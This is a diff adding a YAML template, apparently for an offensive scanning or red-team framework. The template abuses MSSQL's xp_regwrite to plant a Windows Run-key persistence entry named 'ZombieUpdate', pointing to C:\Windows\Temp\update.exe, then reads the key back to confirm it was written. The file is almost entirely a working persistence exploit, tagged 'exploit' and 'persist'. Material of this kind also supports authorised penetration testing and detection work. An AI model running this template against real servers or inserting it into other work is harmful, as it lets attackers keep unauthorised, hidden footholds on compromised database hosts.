@@ -1,0 +1,21 @@
+id: mssql-registry-run-persist
+service: [mssql]
+variables:
+  reg_name: ZombieUpdate
+  reg_value: C:\Windows\Temp\update.exe
+info:
+  name: MSSQL Registry Run Key Persistence
+  severity: critical
+  tags: mssql,exploit,persist,registry
+
+services:
+  - ops:
+      - db: "EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '{{reg_name}}', 'REG_SZ', '{{reg_value}}'"
+        name: write_result
+      - db: "EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '{{reg_name}}'"
+        name: verify_result
+    extractors:
+      - type: regex
+        name: mssql_persist_reg_verify
+        part: verify_result
+        regex: ['(?m)(.+)$']
